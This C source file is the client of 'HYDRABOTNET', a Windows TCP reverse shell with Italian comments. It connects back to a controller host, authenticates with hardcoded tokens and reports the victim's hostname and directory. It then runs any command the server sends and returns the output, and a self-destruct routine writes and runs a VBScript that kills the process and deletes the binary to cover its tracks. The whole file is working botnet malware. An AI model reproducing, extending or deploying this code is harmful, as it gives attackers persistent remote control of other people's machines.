/*
	*	*	*	*	*	*	*	*	*	*	*	*	*
	*	*	*	*	*	*	*	*	*	*	*	*	*
	*   H   Y   D   R   A   B   O   T   N   E   T   *
	*   * Multiclient TCP Reverse shell 1.0.3.1 *   *
	*	*	*	*	*	*	*	*	*	*	*	*	*
	*   Scritto in C & test eseguiti Dev-C 5.11 *   *
	*   *  sviluppatore: ************ Lug.2023  *   *
	*   *   *   *   *   *   *   *   *   *   *   *   *
	*	*	*	*	*	*	*	*	*	*	*	*	*
	*   *   *   *  < Client-side >	*	*	*	*	*	
*/

#include <stdio.h>
#include <winsock2.h>
#include <stdbool.h>
#include <unistd.h>
#include <limits.h>	// getcwd path

// Libreria Winsock2
#pragma comment(lib,"ws2_32.lib")

// Try catch
#include <setjmp.h>

bool startsWith (char* base, char* str);

bool startsWith (char* base, char* str)
{
    return (strstr(base, str) - base) == 0;
}

// Try & Catch
#define TRY do{ jmp_buf ex_buf__; if( !setjmp(ex_buf__) ){
#define CATCH } else {
#define ETRY } }while(0)
#define THROW longjmp(ex_buf__, 1)

// Tokens di connessione
#define AUTH_TOKEN   "S7b9cV3mA4jLz7qd"
#define AUTH_MSG     "D4mX0LpNaV1o3FqC"
#define END_AUTH_MSG "Ld5c6q2NbUw1m9zA"
#define END_MSG      "V1bK8Nx5jL3OqfTw"
#define END_CONNECT  "3NdEDC0nN3Ct10nS"

// CharSplitter
#define SPLITTER "00001111"

int main(int argc , char *argv[])
{
	// * * * * * * * * * * * * * * *
	// * * * * * * * * * * * * * * *
	// * * * * * * * * * * * * * * *
	// HOSTNAME or IP ADDR. AND PORT CONFIGS.
	char *host_name = "127.0.0.1";
	//char *host_name = "testnetwork409-62731.portmap.host";
	int port = 8888;
	// * * * * * * * * * * * * * * *
	// * * * * * * * * * * * * * * *
	// * * * * * * * * * * * * * * *	
	
	struct hostent *remoteHost;
	struct in_addr addr;
	char **pAlias;
	DWORD dwError;
	int i = 0;
	
	// Parametri di connessione (socket)
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in client;
	char *message;
	char server_reply[512];
	int recv_size;
	
	// Gestione timeout di chiamata in invio del socket
	struct timeval tv;
	tv.tv_sec = 5;  /* 30 Secs Timeout */
	
	// Variabili di percorso
	char p[100];
	char *path = getcwd(p,100);
	
	// Tempo di attesa per riconnessione (creazione di un nuovo socket)
	int sleep_time = 30;
	
	// Variabili di acquisizione nome macchina
	char *hostname = "localhost";
	struct hostent *hp;
		
	// Connessione al loop principale (loop di invio/ricezione = TRUE se attivo)
	bool connected = false;

	// Manifesto
	printf("\tH Y D R A B O T N E T\n\t* Client: Rel.1.0.3.1 - 02/08/2023\n\t* Autore: **** *** (***)\n");
	
	// Inizializzazione libreria winsock
	printf("\n > Inizializzazione winsock -->");
	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
	{
		printf("Fallito. Codice di errore: %d",WSAGetLastError());
		return 1;
	}
	else
	{
		printf("OK");
	}
	
	// Risolvo l'indirizzo IP dal nome dell'host
	remoteHost = gethostbyname(host_name);

    if (remoteHost == NULL) {
        dwError = WSAGetLastError();
        if (dwError != 0) {
            if (dwError == WSAHOST_NOT_FOUND) {
                printf("\n (Err.) Host not found\n");
                return 1;
            } else if (dwError == WSANO_DATA) {
                printf("\n (Err.) No data record found\n");
                return 1;
            } else {
                printf("\n (Err.) Function failed with error: %ld\n", dwError);
                return 1;
            }
        }
        
    } else {

        printf("\n\tNome indirizzo server: %s\n", remoteHost->h_name);
        printf("\tPorta utilizzata dal server: %d\n", port);
        for (pAlias = remoteHost->h_aliases; *pAlias != 0; pAlias++) {
            printf("\tAlternate name #%d: %s\n", ++i, *pAlias);
        }
        printf("\tTipologia: ");
        switch (remoteHost->h_addrtype) {
        case AF_INET:
            printf("AF_INET\n");
            break;
        case AF_NETBIOS:
            printf("AF_NETBIOS\n");
            break;
        default:
            printf(" %d\n", remoteHost->h_addrtype);
            break;
        }
        printf("\tLunghezza: %d\n", remoteHost->h_length);

        i = 0;
        if (remoteHost->h_addrtype == AF_INET)
        {
            while (remoteHost->h_addr_list[i] != 0) {
                addr.s_addr = *(u_long *) remoteHost->h_addr_list[i++];
                printf("\tIndirizzo IP #%d: %s", i, inet_ntoa(addr));
                
                host_name = inet_ntoa(addr);                
            }
        }
        else if (remoteHost->h_addrtype == AF_NETBIOS)
        {   
            printf("NETBIOS address was returned\n");
        }   
    }	
	
	// Acquisisco nome della macchina
	printf("\n > Acquisizione nome computer -->");
	if ((hp = gethostbyname(hostname)) == NULL)
	{
		//gethostbyname fallito
		printf("[ERRORE] gethostbyname fallito: %d" , WSAGetLastError());
		return 1;
	}
	else
	{
		printf("OK");
	}
	
	printf("\n > Controllo acquisizione nome -->");
	// Controllo acquisizione nome macchina
	if (hp == NULL)
	{
		fprintf(stderr, "Client: non riesco a risolvere indirizzo \"%s\": Error %d\n", hostname, WSAGetLastError());
	}
	else
	{
		printf("OK");
		printf(" [ %s ]", hp->h_name);
	}	
	
	// Ottengo il nome della macchina
	memset(&client, 0, sizeof(client));
	memcpy(&(client.sin_addr), hp->h_addr, hp->h_length);
	client.sin_family = hp->h_addrtype;
	client.sin_port = htons(port);
	//Tipologia del socket e indirizzo del server a cui connettersi
	client.sin_addr.s_addr = inet_addr(host_name);

	// Loop principale (TRUE)
	while(1)
	{
		TRY
		{
			// Creazione del socket...
			if((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
			{
				printf("\n (ERRORE) Creazione socket fallita: %d" , WSAGetLastError());
				THROW;
			}
			else
			{
				printf("\n + Creato un nuovo socket");				
			}			
			
			// Tentativo di connessione al server remoto... [client to server-->SYN]
			if (connect(s, (struct sockaddr *)&client, sizeof(client)) < 0)
			{
				printf("\n ! Socket timeout: server irraggiungibile");
				THROW;
				//return 1;
			}
			else
			{
				printf("\n + Connessione al server riuscita (attesa risposta)");
				
				// Ricevo una risposta dal server [server to client-->(SYN + ACK), finally client to server-->ACK]
				if((recv_size = recv(s, server_reply, 512, 0)) == SOCKET_ERROR)
				{
					printf("\n ! (Errore) Ricezione fallita, disconnessione del server");
					THROW;
				}
				else
				{
					// Aggiungo un carattere finale nullo per fare diventare la variabile una stringa corretta prima di stamparla
					server_reply[recv_size] = '\0';
					//printf("\n + [RISPOSTA DAL SERVER]-->%s", server_reply);
					
					// Controllo se il token di accesso è corretto
					if (strcmp(server_reply, AUTH_TOKEN) == 0)
					{
						//Ottengo la directory di lavoro
						char path[PATH_MAX];
						getcwd(path, sizeof(path));
						
						// Concateno le stringhe per formare il messaggio finale da inviare
						char message[512];
						strcpy(message, AUTH_MSG);
						strcat(message, hp->h_name);   // Aggiungo nome macchina
						strcat(message, SPLITTER);	   // Aggiungo uno splitter per la string che va al server
						strcat(message, path);         // Aggiungo directory di lavoro
						
						// invio un msg al server identificativo HOSTNAME e PERCORSO di lavoro (CLIENT)
						send(s, message, strlen(message), 0);
						
						// Termino l'autenticazione e avvio il loop principale CONNECTED						
						if((recv_size = recv(s, server_reply, 512, 0)) != SOCKET_ERROR)
						{
							// Stringa stampabile
							server_reply[recv_size] = '\0';
							
							if (startsWith(server_reply, END_AUTH_MSG))
							{
								printf("\n + Autenticazione riuscita");
								// Rispondo al server (Messaggio di autenticazione conclusa)								
								send(s, END_MSG, strlen(END_MSG), 0);							
								
								// Autenticazione riuscita
								connected = true;
							}
						}
						else
						{
							printf("\n ! (Errore) Autenticazione fallita");
						}
					}					
					
					// Avvio loop PRINCIPALE solo se connesso				
					while (connected)
					{
						// Ricevo una risposta dal server
						if((recv_size = recv(s, server_reply, 512, 0)) != SOCKET_ERROR)
						{
							// Stringa stampabile
							server_reply[recv_size] = '\0';
							
							// messaggio dal server in raw
							//printf("\n + Risposta dal server: %s", server_reply);					
							
							// controllo se inizia per...
							if (startsWith(server_reply, AUTH_MSG))
							{
								// True - accorcio il messaggio e lo eseguo
								// Applico un puntatore alla variabile messaggio ricevuto
								char *msg_display = server_reply;
								// Rimuovo i primi 16 caratteri di autenticazione (che non ci interessano)
								msg_display += 16;

								// * * * * * PREPARAZIONE DEL BUFFER DI RISPOSTA * * * * *								
								FILE *fp;
								int BUFSIZE = 512;
								char buffer[BUFSIZE];
									
								// Concateno le stringhe per ottenere il messaggio output bidirezionale (stdout ed stderr)
								char stdin_command[512];
								char add_str[8] = " 2>&1";
								strcpy(stdin_command, msg_display);
								strcat(stdin_command, add_str);									
								//printf("\n-->comando che inserisco nel popen:%s", stdin_command);
								
								// * * * * * CONTROLLI SUL MESSAGGIO RICEVUTO * * * * * *
								if (startsWith(msg_display, "cd "))
								{
									msg_display += 3;
									
									TRY
									{
										int changeDir;
										changeDir = chdir(msg_display);
										// Controlla se valido
										if (changeDir != 0)
										{											
											THROW;
										}
										else
										{											
											// Ottengo la directory di lavoro
											char path[PATH_MAX];
											getcwd(path, sizeof(path));
											// Invio il valore del percorso di lavoro					
											send(s, path, strlen(path), 0);
											
										}										
									}
									CATCH
									{
										char *path_exception_msg = "Errore: percorso non trovato";
										send(s, path_exception_msg, strlen(path_exception_msg), 0);
										printf("\n! Exception: percorso non trovato");
																			
									}
									ETRY;
																		
								}
								else if (startsWith(msg_display, "send "))
								{
									msg_display += 5;
									// Header stringa invio messaggio a video
									char string1[256] = "msg * ";									
									strcat(string1, msg_display);									
									system(string1);									
								}
								else if (startsWith(msg_display, "selfdestruct"))
								{
									printf("\n > Avvio autodistruzione...");
									printf("\n > Percorso eseguibile: %s", path);
									
									// Ottengo il nome del processo
									char *processname = argv[0];
									char *last = strrchr(processname, '\\');
									if (last != NULL)
									{
										processname = last+1;
									}
									
									printf("\n > Nome eseguibile: %s", processname);
									
									// Ottengo percorso cartella file temporanei del sistema operativo
									char *temporary_dir = getenv("TEMP");
									
									// Costruisco stringa percorso per inserirla nel file di autodistruzione vbscript
									char slash[2] = "\\";									
									strcat(path, slash);
									strcat(path, processname);  //----> Ottengo path
									
									// Nome del file vbscript che autodistrugge eseguibile
									char *file = "\\delete.vbs";
									strcat(temporary_dir, file);  //----> Ottengo tempDir
										
									TRY
									{
										// Creo il file vbscript che elimina eseguibile
										FILE *fp = fopen(temporary_dir, "w");
										if (fp == NULL)
										{
											printf("Error opening the file %s", temporary_dir);
											return -1;
										}
										// Uccido prima il processo
										fprintf(fp, "Dim oShell : Set oShell = CreateObject(\"WScript.Shell\")");
										fprintf(fp, "\noShell.Run \"taskkill /f /im %s\"", processname);
										fprintf(fp, "\nWScript.Sleep 5000");
										fprintf(fp, "\nSet obj = createobject(\"Scripting.FileSystemObject\")\n");
										fprintf(fp, "Dim filename1\n");
										fprintf(fp, "filename1=\"%s\"\n", path);
										fprintf(fp, "obj.DeleteFile filename1\n");
										fprintf(fp, "Set obj=Nothing");
										// Chiudo il file
										fclose(fp);
										
										system("delete.vbs");
										
									}
									CATCH
									{
										printf("\n Errore apertura file");
										return -1;
									}
									ETRY;							
								}
								else
								{
									// apro un pipe in modalità (lettura) sul processo voluto dal comando ricevuto sopra
									if ((fp = popen(stdin_command, "r")) == NULL)
									{
										// Nel caso di errore in apertura della pipe
	        							printf("\n - Errore di apertura nel pipe");
	        							return -1;
	        						}
	
									// Ricezione del contenuto di stdoout o stderr
	    							while (fgets(buffer, BUFSIZE, fp) != NULL)
									{
										// Faccio diventare buffer una stringa stampabile
										buffer[BUFSIZE] = '\0';
	        							// Stampo la stringa di buffer
	        							printf("%s", buffer);
	        							
	        							// Invio la stringa di buffer come risultato dell'esecuzione del comando al server
	        							send(s, buffer, strlen(buffer), 0);
	    							}
							
	    							if (pclose(fp))
									{
	        							printf("\n <stderr> Exited with error status...\n");								       							
	       								//return -1;
	    							}
								}
								
    							// Invio il messaggio di chiusura
    							send(s, END_MSG, strlen(END_MSG), 0);											
							}
							else
							{
								// Chiudo la connessione col server
								if (startsWith(server_reply, END_CONNECT))
								{
									printf("\n > Disconnessione: nuovo tentativo di riconnessione %ds", sleep_time);
									closesocket(s);
									connected = false;
									sleep(sleep_time);									
								}
							}
						}
						else
						{
							printf("\n ! (Errore socket) Connessione col server interrotta");
							connected = false;
						}
					}					
				}
			}
		}
		CATCH
		{
			printf("\n + Nuovo tentativo di connessione tra %d secondi", sleep_time);
			closesocket(s);
			sleep(sleep_time);
		}
		ETRY;
	}
	return 0;
}
